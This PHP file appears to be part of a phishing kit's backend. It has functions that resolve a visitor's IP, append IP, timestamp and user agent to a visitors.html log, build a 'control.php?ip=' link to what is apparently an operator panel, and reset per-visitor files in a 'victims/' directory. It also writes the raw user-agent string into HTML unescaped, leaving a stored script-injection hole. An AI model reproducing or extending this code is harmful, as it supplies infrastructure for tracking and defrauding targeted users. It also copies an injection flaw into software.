<?php

    session_start();
    // error_reporting(0);

    require_once 'detect.php';
    function get_client_ip() {
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];
        if(filter_var($client, FILTER_VALIDATE_IP)) {
            $ip = $client;
        } else if(filter_var($forward, FILTER_VALIDATE_IP)) {
            $ip = $forward;
        } else {
            $ip = $remote;
        }
        if( $ip == '::1' ) {
            return '127.0.0.1';
        }
        return  $ip;
    }

    function visitors() {
        $detect         = new BrowserDetection();
        $ip             = $_SERVER['REMOTE_ADDR'];
        $date           = date("Y-m-d H:i:s", time());
        $usragent       = $_SERVER['HTTP_USER_AGENT'];
        $browserName    = $detect->getName();
        $browserVer     = $detect->getVersion();
        $isMobile       = ($detect->isMobile()) ? 'Mobile' : 'Not mobile';
        $platformName   = $detect->getPlatform();
        //$country        = get_client_country();
        $str = " <tr> <th scope='row'>$ip</th>  <td>$date</td> <td>$usragent</td> <td>[$isMobile] $browserName $browserVer </td> </tr>";
        file_put_contents('visitors.html', $str  , FILE_APPEND | LOCK_EX);
    }

    function get_steps_link() {
        $url = "http://". $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
        $x = pathinfo($url);
        return $ee = $x['dirname'] . '/control.php?ip=' . get_client_ip();
    }
    
    function reset_data() {
        $fp = fopen('victims/'. get_client_ip() .'.php', 'wb');
        fwrite($fp, 0);
        fclose($fp);
    }

 